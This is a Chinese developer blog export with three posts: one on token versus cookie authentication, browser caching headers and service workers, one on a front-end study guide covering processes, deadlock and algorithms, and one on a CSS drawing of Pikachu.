需要主要的是，在ACAO头部标明(designating)*时，不得带有像HTTP认证，客户端SSL证书和cookies的证书。 实现思路： 用户登录校验，校验成功后就返回Token给客户端。 客户端收到数据后保存在客户端 客户端每次访问API是携带Token到服务器端。 服务器端采用filter过滤器校验。校验成功则返回请求数据，校验失败则返回错误码 当我们在程序中认证了信息并取得token之后，我们便能通过这个Token做许多的事情。 我们甚至能基于创建一个基于权限的token传给第三方应用程序，这些第三方程序能够获取到我们的数据（当然只有在我们允许的特定的token） Tokens的优势无状态、可扩展 在客户端存储的Tokens是无状态的，并且能够被扩展。基于这种无状态和不存储Session信息，负载负载均衡器能够将用户信息从一个服务传到其他服务器上。 如果我们将已验证的用户的信息保存在Session中，则每次请求都需要用户向已验证的服务器发送验证信息(称为Session亲和性)。用户量大时，可能会造成一些拥堵。 但是不要着急。使用tokens之后这些问题都迎刃而解，因为tokens自己hold住了用户的验证信息。 安全性 请求中发送token而不再是发送cookie能够防止CSRF(跨站请求伪造)。即使在客户端使用cookie存储token，cookie也仅仅是一个存储机制而不是用于认证。不将信息存储在Session中，让我们少了对session操作。 token是有时效的，一段时间之后用户需要重新验证。我们也不一定需要等到token自动失效，token有撤回的操作，通过token revocataion可以使一个特定的token或是一组有相同认证的token无效。 可扩展性 Tokens能够创建与其它程序共享权限的程序。例如，能将一个随便的社交帐号和自己的大号(Fackbook或是Twitter)联系起来。当通过服务登录Twitter(我们将这个过程Buffer)时，我们可以将这些Buffer附到Twitter的数据流上(we are allowing Buffer to post to our Twitter stream)。 使用tokens时，可以提供可选的权限给第三方应用程序。当用户想让另一个应用程序访问它们的数据，我们可以通过建立自己的API，得出特殊权限的tokens。 多平台跨域 我们提前先来谈论一下CORS(跨域资源共享)，对应用程序和服务进行扩展的时候，需要介入各种各种的设备和应用程序。 Having our API just serve data, we can also make the design choice to serve assets from a CDN. This eliminates the issues that CORS brings up after we set a quick header configuration for our application. 只要用户有一个通过了验证的token，数据和资源就能够在任何域上被请求到。 1Access-Control-Allow-Origin: * 基于标准创建token的时候，你可以设定一些选项。我们在后续的文章中会进行更加详尽的描述，但是标准的用法会在JSON Web Tokens体现。 最近的程序和文档是供给JSON Web Tokens的。它支持众多的语言。这意味在未来的使用中你可以真正的转换你的认证机制。 对比CookieCookies验证是有状态（stateful）的。这意味着，权限信息（比如session ID）必须同时在客户端和服务端维护。服务端需要根据session cookies信息去数据库查询用户相关信息；客户端每次发起请求时都必须带上Cookies信息作为身份验证。 特征： 1.不需要前端存储Cookies由后台设置（response header里的Set-Cookie），浏览器会在后续的请求中自动加上Cookies信息。有CSRF(跨站点伪造请求)风险 2.Cookies是不支持跨域访问的，一般只能在某个域名及其子域名下被访问。但是，由于Cookies可以通过JS代码获取（document.cookies），由此，可能会引发安全问题，比如著名的CSRF攻击（跨站请求伪造）。 3.移动端用在使用cookie时有各种不便利和局限 4.移动端平台和Cookies配合并不是太好，可能会在Cookies使用上有局限性。 5.Cookies可以在同一域名下或者同一主域不同子域下共享，一旦跨主域，就无法共享 如果遇到跨域共享身份信息的情况，就必须靠服务器协助（例如单点登录：一个身份，需要登录多个主域） 身份验证1.用户输入登陆凭据； 2.服务器验证凭据是否正确，并创建会话，然后把会话数据存储在数据库中； 3.具有会话id的cookie被放置在用户浏览器中； 4.服务器验证凭据是否正确，并创建会话； 5.在后续请求中，服务器会根据数据库验证会话id，如果验证通过，则继续处理； 6.一旦用户登出，服务端和客户端同时销毁该会话在后续请求中，服务器会根据数据库验证会话id，如果验证通过，则继续处理； TokenToken是无状态的（stateless）。也就是说，服务端不需要在数据库中存储和Token相关的字段，Token本身就已经包含了用户的所有信息 客户端一般在request header里面利用Authorization头传递Token值，格式为Bearer {JWT}（该格式并不是绝对的，要根据服务端具体情况来设置）。 特征： 1.Token值同样需要服务端提供（通过API返回）和Cookies不同，返回值不需要挂载在Set-Cookie上，而是利用其它response header或者response body返回Token值； 2.需要客户端存储和Cookies不同，浏览器无法自动在下一次请求中自动挂载身份信息。客户端必须自行存储Token值（建议用localstorage），然后在后续请求中通过设置request header来传递Token信息； 3.无CSRF风险适合移动端身份认证 4.Token支持各类跨域 身份验证 1.服务器验证凭据是否正确，然后返回一个经过签名的token； 2.客户端负责存储token，可以存在localstorage，或者cookie中 3.对服务器的请求带上这个token； 4.服务器对JWT进行解码，如果token有效，则处理该请求； 5.一旦用户登出，客户端销毁token。 四、IndexDB浏览器内置数据库系统，用于储存大量结构化数据 五、Cache API最初为 service workers 创建，用于缓存网络请求，API公开了window.caches,允许保存可永远以后访问的Requests和Responses对 缓存缓存位置从缓存位置上来说分为四种，并且各自有优先级，当依次查找缓存且都没有命中的时候，才会去请求网络。 Service Worker Memory Cache Disk Cache Push Cache 1. Service WorkerService Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。使用 Service Worker的话，传输协议必须为 HTTPS。因为 Service Worker 中涉及到请求拦截，所以必须使用 HTTPS 协议来保障安全。Service Worker 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。 Service Worker 实现缓存功能一般分为三个步骤：首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。 当 Service Worker 没有命中缓存的时候，我们需要去调用 fetch 函数获取数据。也就是说，如果我们没有在 Service Worker 命中缓存的话，会根据缓存查找优先级去查找数据。但是不管我们是从 Memory Cache 中还是从网络请求中获取的数据，浏览器都会显示我们是从 Service Worker 中获取的内容。 2. Memory CacheMemory Cache 也就是内存中的缓存，主要包含的是当前中页面中已经抓取到的资源,例如页面上已经下载的样式、脚本、图片等。读取内存中的数据肯定比磁盘快,内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放。 一旦我们关闭 Tab 页面，内存中的缓存也就被释放了。 那么既然内存缓存这么高效，我们是不是能让数据都存放在内存中呢？这是不可能的。计算机中的内存一定比硬盘容量小得多，操作系统需要精打细算内存的使用，所以能让我们使用的内存必然不多。 当我们访问过页面以后，再次刷新页面，可以发现很多数据都来自于内存缓存 内存缓存中有一块重要的缓存资源是preloader相关指令（例如&lt;link rel=&quot;prefetch&quot;&gt;）下载的资源。总所周知preloader的相关指令已经是页面优化的常见手段之一，它可以一边解析js/css文件，一边网络请求下一个资源。 需要注意的事情是，内存缓存在缓存资源时并不关心返回资源的HTTP缓存头Cache-Control是什么值，同时资源的匹配也并非仅仅是对URL做匹配，还可能会对Content-Type，CORS等其他特征做校验。 3. Disk CacheDisk Cache 也就是存储在硬盘中的缓存，读取速度慢点，但是什么都能存储到磁盘中，比之 Memory Cache 胜在容量和存储时效性上。 在所有浏览器缓存中，Disk Cache 覆盖面基本是最大的。它会根据 HTTP Herder 中的字段判断哪些资源需要缓存，哪些资源可以不请求直接使用，哪些资源已经过期需要重新请求。并且即使在跨站点的情况下，相同地址的资源一旦被硬盘缓存下来，就不会再次去请求数据。绝大部分的缓存都来自 Disk Cache，关于 HTTP 的协议头中的缓存字段，我们会在下文进行详细介绍。 浏览器会把哪些文件丢进内存中？哪些丢进硬盘中？ 关于这点，网上说法不一，不过以下观点比较靠得住： 对于大文件来说，大概率是不存储在内存中的，反之优先 当前系统内存使用率高的话，文件优先存储进硬盘 4. Push CachePush Cache（推送缓存）是 HTTP/2 中的内容，当以上三种缓存都没有命中时，它才会被使用。它只在会话（Session）中存在，一旦会话结束就被释放，并且缓存时间也很短暂，在Chrome浏览器中只有5分钟左右，同时它也并非严格执行HTTP头中的缓存指令。 Push Cache 在国内能够查到的资料很少，也是因为 HTTP/2 在国内不够普及。这里推荐阅读Jake Archibald的 HTTP/2 push is tougher than I thought 这篇文章，文章中的几个结论： 所有的资源都能被推送，并且能够被缓存,但是 Edge 和 Safari 浏览器支持相对比较差 可以推送 no-cache 和 no-store 的资源 一旦连接被关闭，Push Cache 就被释放 多个页面可以使用同一个HTTP/2的连接，也就可以使用同一个Push Cache。这主要还是依赖浏览器的实现而定，出于对性能的考虑，有的浏览器会对相同域名但不同的tab标签使用同一个HTTP连接。 Push Cache 中的缓存只能被使用一次 浏览器可以拒绝接受已经存在的资源推送 你可以给其他域名推送资源 如果以上四种缓存都没有命中的话，那么只能发起请求来获取资源了。 那么为了性能上的考虑，大部分的接口都应该选择好缓存策略，通常浏览器缓存策略分为两种：强缓存和协商缓存，并且缓存策略都是通过设置 HTTP Header 来实现的。 缓存过程分析浏览器与服务器通信的方式为应答模式，即是：浏览器发起HTTP请求 – 服务器响应该请求，那么浏览器怎么确定一个资源该不该缓存，如何去缓存呢？浏览器第一次向服务器发起该请求后拿到请求结果后，将请求结果和缓存标识存入浏览器缓存，浏览器对于缓存的处理是根据第一次请求资源时返回的响应头来确定的。具体过程如下图： 由上图我们可以知道： 浏览器每次发起请求，都会先在浏览器缓存中查找该请求的结果以及缓存标识 浏览器每次拿到返回的请求结果都会将该结果和缓存标识存入浏览器缓存中 以上两点结论就是浏览器缓存机制的关键，它确保了每个请求的缓存存入与读取，只要我们再理解浏览器缓存的使用规则，那么所有的问题就迎刃而解了，本文也将围绕着这点进行详细分析。为了方便大家理解，这里我们根据是否需要向服务器重新发起HTTP请求将缓存过程分为两个部分，分别是强缓存和协商缓存。 https://www.cnblogs.com/lyzg/p/5125934.html#_label2 强缓存强缓存：不会向服务器发送请求，直接从缓存中读取资源，在chrome控制台的Network选项中可以看到该请求返回200的状态码，并且Size显示from disk cache或from memory cache。强缓存可以通过设置两种 HTTP Header 实现：Expires 和 Cache-Control。 1. Expires缓存过期时间，用来指定资源到期的时间，是服务器端的具体的时间点。也就是说，Expires=max-age + 请求时间，需要和Last-modified结合使用。Expires是Web服务器响应消息头字段，在响应http请求时告诉浏览器在过期时间前浏览器可以直接从浏览器缓存取数据，而无需再次请求。 Expires 是 HTTP/1 的产物，受限于本地时间，如果修改了本地时间，可能会造成缓存失效。Expires: Wed, 22 Oct 2018 08:41:00 GMT表示资源会在 Wed, 22 Oct 2018 08:41:00 GMT 后过期，需要再次请求。 2.Cache-Control在HTTP/1.1中，Cache-Control是最重要的规则，主要用于控制网页缓存。比如当Cache-Control:max-age=300时，则代表在这个请求正确返回时间（浏览器也会记录下来）的5分钟内再次加载资源，就会命中强缓存。 Cache-Control 可以在请求头或者响应头中设置，并且可以组合使用多种指令： public：所有内容都将被缓存（客户端和代理服务器都可缓存）。具体来说响应可被任何中间节点缓存，如 Browser &lt;– proxy1 &lt;– proxy2 &lt;– Server，中间的proxy可以缓存资源，比如下次再请求同一资源proxy1直接把自己缓存的东西给 Browser 而不再向proxy2要。 private：所有内容只有客户端可以缓存，Cache-Control的默认取值。具体来说，表示中间节点不允许缓存，对于Browser &lt;– proxy1 &lt;– proxy2 &lt;– Server，proxy 会老老实实把Server 返回的数据发送给proxy1,自己不缓存任何数据。当下次Browser再次请求时proxy会做好请求转发而不是自作主张给自己缓存的数据。no-cache：客户端缓存内容，是否使用缓存则需要经过协商缓存来验证决定。表示不使用 Cache-Control的缓存控制方式做前置验证，而是使用 Etag 或者Last-Modified字段来控制缓存。需要注意的是，no-cache这个名字有一点误导。设置了no-cache之后，并不是说浏览器就不再缓存数据，只是浏览器在使用缓存数据时，需要先确认一下数据是否还跟服务器保持一致。 no-store：所有内容都不会被缓存，即不使用强制缓存，也不使用协商缓存 max-age：max-age=xxx (xxx is numeric)表示缓存内容将在xxx秒后失效 s-maxage（单位为s)：同max-age作用一样，只在代理服务器中生效（比如CDN缓存）。比如当s-maxage=60时，在这60秒中，即使更新了CDN的内容，浏览器也不会进行请求。max-age用于普通缓存，而s-maxage用于代理缓存。s-maxage的优先级高于max-age。如果存在s-maxage，则会覆盖掉max-age和Expires header。 max-stale：能容忍的最大过期时间。max-stale指令标示了客户端愿意接收一个已经过期了的响应。如果指定了max-stale的值，则最大容忍时间为对应的秒数。如果没有指定，那么说明浏览器愿意接收任何age的响应（age表示响应由源站生成或确认的时间与当前时间的差值）。 min-fresh：能够容忍的最小新鲜度。min-fresh标示了客户端不愿意接受新鲜度不多于当前的age加上min-fresh设定的时间之和的响应。 从图中我们可以看到，我们可以将多个指令配合起来一起使用，达到多个目的。比如说我们希望资源能被缓存下来，并且是客户端和代理服务器都能缓存，还能设置缓存失效时间等等。 3.Expires和Cache-Control两者对比其实这两者差别不大，区别就在于 Expires 是http1.0的产物，Cache-Control是http1.1的产物，两者同时存在的话，Cache-Control优先级高于Expires；在某些不支持HTTP1.1的环境下，Expires就会发挥用处。所以Expires其实是过时的产物，现阶段它的存在只是一种兼容性的写法。强缓存判断是否缓存的依据来自于是否超出某个时间或者某个时间段，而不关心服务器端文件是否已经更新，这可能会导致加载文件不是服务器端最新的内容，那我们如何获知服务器端内容是否已经发生了更新呢？此时我们需要用到协商缓存策略。 协商缓存协商缓存就是强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程，主要有以下两种情况： 协商缓存生效，返回304和Not Modified 协商缓存失效，返回200和请求结果 协商缓存可以通过设置两种 HTTP Header 实现：Last-Modified 和 ETag 。 1.Last-Modified和If-Modified-Since浏览器在第一次访问资源时，服务器返回资源的同时，在response header中添加 Last-Modified的header，值是这个资源在服务器上的最后修改时间，浏览器接收后缓存文件和header； 1Last-Modified: Fri, 22 Jul 2016 01:47:00 GMT 浏览器下一次请求这个资源，浏览器检测到有 Last-Modified这个header，于是添加If-Modified-Since这个header，值就是Last-Modified中的值；服务器再次收到这个资源请求，会根据 If-Modified-Since 中的值与服务器中这个资源的最后修改时间对比，如果没有变化，返回304和空的响应体，直接从缓存读取，如果If-Modified-Since的时间小于服务器中这个资源的最后修改时间，说明文件有更新，于是返回新的资源文件和200 但是 Last-Modified 存在一些弊端： 如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 Last-Modified 被修改，服务端不能命中缓存导致发送相同的资源 因为 Last-Modified 只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源 既然根据文件修改时间来决定是否缓存尚有不足，能否可以直接根据文件内容是否修改来决定缓存策略？所以在 HTTP / 1.1 出现了 ETag和If-None-Match 2. ETag和If-None-MatchEtag是服务器响应请求时，返回当前资源文件的一个唯一标识(由服务器生成)，只要资源有变化，Etag就会重新生成。浏览器在下一次加载资源向服务器发送请求时，会将上一次返回的Etag值放到request header里的If-None-Match里，服务器只需要比较客户端传来的If-None-Match跟自己服务器上该资源的ETag是否一致，就能很好地判断资源相对客户端而言是否被修改过了。如果服务器发现ETag匹配不上，那么直接以常规GET 200回包形式将新的资源（当然也包括了新的ETag）发给客户端；如果ETag是一致的，则直接返回304知会客户端直接使用本地缓存即可。 3. 两者之间对比： 首先在精确度上，Etag要优于Last-Modified。 Last-Modified的时间单位是秒，如果某个文件在1秒内改变了多次，那么他们的Last-Modified其实并没有体现出来修改，但是Etag每次都会改变确保了精度；如果是负载均衡的服务器，各个服务器生成的Last-Modified也有可能不一致。 第二在性能上，Etag要逊于Last-Modified，毕竟Last-Modified只需要记录时间，而Etag需要服务器通过算法来计算出一个hash值。 第三在优先级上，服务器校验优先考虑Etag 缓存机制强制缓存优先于协商缓存进行，若强制缓存(Expires和Cache-Control)生效则直接使用缓存，若不生效则进行协商缓存(Last-Modified / If-Modified-Since和Etag / If-None-Match)，协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，返回200，重新返回资源和缓存标识，再存入浏览器缓存中；生效则返回304，继续使用缓存。具体流程图如下： 看到这里，不知道你是否存在这样一个疑问:如果什么缓存策略都没设置，那么浏览器会怎么处理？ 对于这种情况，浏览器会采用一个启发式的算法，通常会取响应头中的 Date 减去 Last-Modified 值的 10% 作为缓存时间。 实际场景应用缓存策略1. 频繁变动的资源 Cache-Control: no-cache 对于频繁变动的资源，首先需要使用Cache-Control: no-cache 使浏览器每次都请求服务器，然后配合 ETag 或者 Last-Modified 来验证资源是否有效。这样的做法虽然不能节省请求数量，但是能显著减少响应数据大小。 2. 不常变化的资源 Cache-Control: max-age=31536000 通常在处理这类资源时，给它们的 Cache-Control 配置一个很大的 max-age=31536000 (一年)，这样浏览器之后请求相同的 URL 会命中强制缓存。而为了解决更新的问题，就需要在文件名(或者路径)中添加 hash， 版本号等动态字符，之后更改动态字符，从而达到更改引用 URL 的目的，让之前的强制缓存失效 (其实并未立即失效，只是不再使用了而已)。在线提供的类库 (如 jquery-3.3.1.min.js, lodash.min.js 等) 均采用这个模式。 用户行为对浏览器缓存的影响所谓用户行为对浏览器缓存的影响，指的就是用户在浏览器如何操作时，会触发怎样的缓存策略。主要有 3 种： 打开网页，地址栏输入地址： 查找 disk cache 中是否有匹配。如有则使用；如没有则发送网络请求。 普通刷新 (F5)：因为 TAB 并没有关闭，因此 memory cache 是可用的，会被优先使用(如果匹配的话)。其次才是 disk cache。 强制刷新 (Ctrl + F5)：浏览器不使用缓存，因此发送的请求头部均带有 Cache-control: no-cache(为了兼容，还带了 Pragma: no-cache),服务器直接返回 200 和最新内容。 Service WorkerService workers 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。 服务工作线程概念和用法节Service worker是一个注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。 Service worker运行在worker上下文，因此它不能访问DOM。相对于驱动应用的主JavaScript线程，它运行在其他线程中，所以不会造成阻塞。它设计为完全异步，同步API（如XHR和localStorage）不能在service worker中使用。 出于安全考量，Service workers只能由HTTPS承载，毕竟修改网络请求的能力暴露给中间人攻击会非常危险。在Firefox浏览器的用户隐私模式，Service Worker不可用。 使用 ServiceWorkerContainer.register() 方法首次注册service worker。如果注册成功，service worker就会被下载到客户端并尝试安装或激活（见下文），这将作用于整个域内用户可访问的URL，或者其特定子集。 下载、安装和激活此时，你的服务工作者(service worker)将遵守以下生命周期： 下载 安装 激活 用户首次访问service worker控制的网站或页面时，service worker会立刻被下载。 之后至少每24小时它会被下载一次。它可能被更频繁地下载，不过每24小时一定会被下载一次，以避免不良脚本长时间生效。 Service workers也可以用来做这些事情： 后台数据同步 响应来自其它源的资源请求 集中接收计算成本高的数据更新，比如地理位置和陀螺仪信息，这样多个页面就可以利用同一组数据 在客户端进行CoffeeScript，LESS，CJS/AMD等模块编译和依赖管理（用于开发目的） 后台服务钩子 自定义模板用于特定URL模式 性能增强，比如预取用户可能需要的资源，比如相册中的后面数张图片 未来service workers能够用来做更多使web平台接近原生应用的事。 值得关注的是，其他标准也能并且将会使用service worker，例如: 后台同步：启动一个service worker即使没有用户访问特定站点，也可以更新缓存 响应推送：启动一个service worker向用户发送一条信息通知新的内容可用 对时间或日期作出响应 进入地理围栏 https://zhuanlan.zhihu.com/p/47407398https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/ https://zhuanlan.zhihu.com/p/54314093 https://zhuanlan.zhihu.com/p/61704951 https://zhuanlan.zhihu.com/p/62168010]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>学习指南</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习指南]]></title>
    <url>%2F2019%2F06%2F03%2Finterview%2F</url>
    <content type="text"><![CDATA[前言 前端学习指南 前言计算机通识计算机组成原理https://github.com/CyC2018/CS-Notes/blob/master/notes/pics/_u4E0B_u8F7D.png) 计算机网络操作系统内存栈内存中变量存储的是对象在堆内存中的地址 进程与线程进程是 CPU 资源分配的最小单位；线程是 CPU 调度的最小单位。 以 Chrome 浏览器中为例，当你打开一个 Tab 页时，其实就是创建了一个进程，一个进程中可以有多个线程（下文会详细介绍），比如渲染线程、JS 引擎线程、HTTP 请求线程等等。当你发起一个请求时，其实就是创建了一个线程，当请求结束后，该线程可能就会被销毁。 当我们启动一个应用，计算机会创建一个进程，操作系统会为进程分配一部分内存，应用的所有状态都会保存在这块内存中，应用也许还会创建多个线程来辅助工作，这些线程可以共享这部分内存中的数据。如果应用关闭，进程会被终结，操作系统会释放相关内存。 一个进程还可以要求操作系统生成另一个进程来执行不同的任务，系统会为新的进程分配独立的内存，两个进程之间可以使用 IPC （Inter Process Communication）进行通信。很多应用都会采用这样的设计，如果一个工作进程反应迟钝，重启这个进程不会影响应用其它进程的工作。 线程的那些资源共享，那些资源不共享 共享的资源有 a. 堆 由于堆是在进程空间中开辟出来的，所以它是理所当然地被共享的；因此new出来的都是共享的（16位平台上分全局堆和局部堆，局部堆是独享的） b. 全局变量 它是与具体某一函数无关的，所以也与特定线程无关；因此也是共享的 c. 静态变量虽然对于局部变量来说，它在代码中是“放”在某一函数中的，但是其存放位置和全局变量一样，存于堆中开辟的.bss和.data段，是共享的 d. 文件等公用资源 这个是共享的，使用这些公共资源的线程必须同步。Win32 提供了几种同步资源的方式，包括信号、临界区、事件和互斥体。 独享的资源有 a. 栈 栈是独享的 b. 寄存器 这个可能会误解，因为电脑的寄存器是物理的，每个线程去取值难道不一样吗？其实线程里存放的是副本，包括程序计数器PC 死锁死锁是指两个或两个以上的进程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。 死锁的发生必须具备以下四个必要条件： 1）互斥条件：指进程对所分配到的资源进行排它性使用，即在一段时间内某资源只由一个进程占用。如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放。 （打破互斥条件：改造独占性资源为虚拟资源，大部分资源已无法改造） 2）请求和保持条件：指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放。 （打破不可抢占条件：当一进程占有一独占性资源后又申请一独占性资源而无法满足，则退出原占有的资源） 3）不剥夺条件：指进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放。 （打破占有且申请条件：采用资源预先分配策略，即进程运行前申请全部资源，满足则运行，不然就等待，这样就不会占有且申请） 4）环路等待条件：指在发生死锁时，必然存在一个进程——资源的环形链，即进程集合{P0，P1，P2，···，Pn}中的P0正在等待一个P1占用的资源；P1正在等待P2占用的资源，……，Pn正在等待已被P0占用的资源。 （打破循环等待条件：实现资源有序分配策略，对所有设备实现分类编号，所有进程只能采用按序号递增的形式申请资源） 编译原理数学基础离散数学线性代数数据结构与算法数据结构线性表栈、队列两个栈实现队列。 链表插入节点、链表逆置、使用链表进行大数字的加减，双向链表实现队列、寻找链表中的环） 树层次遍历、求深度、求两个节点距离、翻转二叉树、前中后序遍历）红黑树性质 堆大量数据中寻找最大N个数字几乎每次都会问，还有堆在插入时进行的调整） 图深度广度优先遍历、单源最短路径、最小生成树） 算法查找二分查找（一般会深入，如寻找数组总和为K的两个数字 排序排序（八大排序，各自的时间复杂度、排序算法的稳定性。快排几乎每次都问） 动态规划贪心分治前端基础HTML5H5新特性：(1)Canvas绘图(2)SVG绘图(3)地理定位(4)Web Workerweb worker 是运行在后台的 JS，独立于其他脚本，不会影响页面的性能。(5)Web Storage1.Cookie技术 （ 兼容性好,数据不能超4kb,操作复杂）2.（兼容性差,数据8MB,操作简单）sessionStorage 3.localStorage(6)Web SocketWebSocket协议是基于TCP的一种新的网络协议。它实现了浏览器与服务器全双工(full-duplex)通信——允许服务器主动发送信息给客户端。 CSS31.复杂的选择器2.弹性布局3.动画 dpr initial-scale px rem 物理像素 JavaScript12const peopleConfig = Object.create(peopleConfigPrototype)// 采用Object.create方法，当前对象将被复制到peopleConfig的__proto__上 还有另一种方式进行对象拷贝，但是会丢掉对象中的函数： 1const peopleConfig = JSON.parse(JSON.stringfy(peopleConfigProtytype)) MVC，MVVM就是非常典型的中介模式。 中介模式，桥接模式，代理模式的区别是： 代理模式一对一，只能代理特定类和对象，是对其的扩展或是约束。 桥接模式一对多，是对类或对象成员或属性的扩展。 中介模式多对多，全权承包所有两个概念间的关系。 https://zhuanlan.zhihu.com/p/43283016 设计模式 ES6ES7+TypeScript1.它是JavaScript的一个超集，而且本质上向这个语言添加了可选的静态类型和基于类的面向对象编程。2.TypeScript扩展了JavaScript的语法，所以任何现有的JavaScript程序可以不加改变的在TypeScript下工作。TypeScript是为大型应用之开发而设计，而编译时它产生 JavaScript 以确保兼容性。 Node.js浏览器数据库cookie/session/LocalStorage/SessionStorage cookie session LocalStorage SessionStorage 工程化性能优化安全测试管理GitWebpack模块化组件化 名称 说明 举例 JS模块 独立的算法和数据单元 浏览器环境检测(detect)，网络请求(ajax)，应用配置(config)，DOM操作(dom)，工具函数(utils)，以及组件里的JS单元 CSS模块 独立的功能性样式单元 栅格系统(grid)，字体图标(icon-fonts)，动画样式(animate)，以及组件里的CSS单元 UI组件 独立的可视/可交互功能单元 页头(header)，页尾(footer)，导航栏(nav)，搜索框(search) 页面 前端这种GUI软件的界面状态，是UI组件的容器 首页(index)，列表页(list)，用户管理(user) 应用 整个项目或整个站点被称之为应用，由多个页面组成 框架ReactVue设计模式函数式编程https://www.flyzy2005.cn/tech/net/https-ssl-tls/ https://github.com/CyC2018/CS-Notes]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>学习指南</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何用CSS画一只电老鼠]]></title>
    <url>%2F2019%2F05%2F12%2Fpikachu%2F</url>
    <content type="text"><![CDATA[如何用CSS画一只电老鼠 不知道大家有没有去看大侦探皮卡丘呀，有没有被银幕上毛茸茸的电老鼠萌到呢？现在我就来用CSS画一只简易版的皮卡丘吧。（希望不会收到东半球最强法务部的律师函） 12345678910111213141516171819&lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;head&quot;&gt; &lt;div class=&quot;ear left&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ear right&quot;&gt;&lt;/div&gt; &lt;div class=&quot;eye left&quot;&gt;&lt;/div&gt; &lt;div class=&quot;eye right&quot;&gt;&lt;/div&gt; &lt;div class=&quot;face left&quot;&gt;&lt;/div&gt; &lt;div class=&quot;face right&quot;&gt;&lt;/div&gt; &lt;div class=&quot;mouth&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;ball&quot;&gt; &lt;div class=&quot;belt&quot;&gt; &lt;div class=&quot;lock&quot;&gt; &lt;div class=&quot;but&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;light&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177body&#123; display: flex; justify-content: center; align-items: center; min-height: 100vh; &#125;.main&#123; position: relative;&#125;.ear.left&#123; background: #ffe000; width:40px; height:90px; position: absolute; top:-44px; left:0; border-radius: 20px 20px 20px 20px/70px 070px 20px 20px; transform: rotate(-30deg); display: flex; justify-content: center; overflow: hidden;&#125;.ear.left::after&#123; content: &quot;&quot;; display: block; width:30px; height:20px; background: #4E4700; border-radius: 15px 15px 20px 20px/70px 70px 20px 20px;&#125;.ear.right&#123; background:#ffe000; width:40px; height:90px; position: absolute; top:-44px; right:0; border-radius: 20px 20px 20px 20px/70px 070px 20px 20px; transform: rotate(35deg); display: flex; justify-content: center; overflow: hidden;&#125;.ear.right::after&#123; content: &quot;&quot;; display: block; width:30px; height:20px; background: #4E4700; border-radius: 15px 15px 20px 20px/70px 70px 20px 20px;&#125;.eye&#123; background: #4E4700; width: 23px; height: 23px; border-radius: 23px;&#125;.eye.left&#123; position: absolute; left:38px; top:44px;&#125;.eye.right&#123; position: absolute; right:38px; top:44px;&#125;.mouth::before&#123; content: &apos;&apos;; display: block; width: 10px; height: 10px; border: 3px solid #4E4700; border-top:none; border-right: none; border-bottom-left-radius: 10px ; transform: rotateZ(-23deg); position: absolute; top:60px; left:86px;&#125;.mouth::after&#123; content: &apos;&apos;; display: block; width: 10px; height: 10px; border: 3px solid #4E4700; border-top: none; border-left: none; border-bottom-right-radius: 10px; transform: rotateZ(23deg); position: absolute; top:60px; right:86px;&#125;.head&#123; border-radius: 200px 200px 0 0; width:200px; height:100px; background:#ffe000;&#125;.face&#123; background:#FF9900; width:30px; height: 30px; border-radius: 30px; &#125;.face.left&#123; position: absolute; left:18px; bottom:101px;;&#125;.face.right&#123; position: absolute; right:18px; bottom:101px;&#125;.ball&#123; border-radius:0 0 200px 200px; width:200px; height:100px; background:#FF0000;&#125;.belt&#123; width:200px; height:15px; background:#322221; border-radius:0 0 2px 2px/0 0 15px 15px; display: flex; justify-content: center;&#125;.lock&#123; border-radius: 0 0 80px 80px; width:80px; height:40px; background:#322221;&#125;.lock::after&#123; content: &quot;&quot;; display:block; border-radius: 0 0 60px 60px; width:60px; height:30px; background:#FDFDFD; transform: translateX(10px);&#125;.but&#123; content: &quot;&quot;; display:block; border-radius: 0 0 40px 40px; width:40px; height:20px; background:#322221; transform: translateX(20px); position: absolute; z-index: 10;&#125;.but::after&#123; content: &quot;&quot;; display:block; border-radius: 0 0 20px 20px; width:20px; height:10px; background:#686160; transform: translateX(10px);&#125;.light&#123; background:#FFD7C9; width: 20px; height: 27px; border-radius: 10px 10px 10px 10px/15px 15px 10px 10px; position: absolute; top:150px; left:150px; transform: rotate(45deg);&#125;]]></content>
      <categories>
        <category>CSS</category>
      </categories>
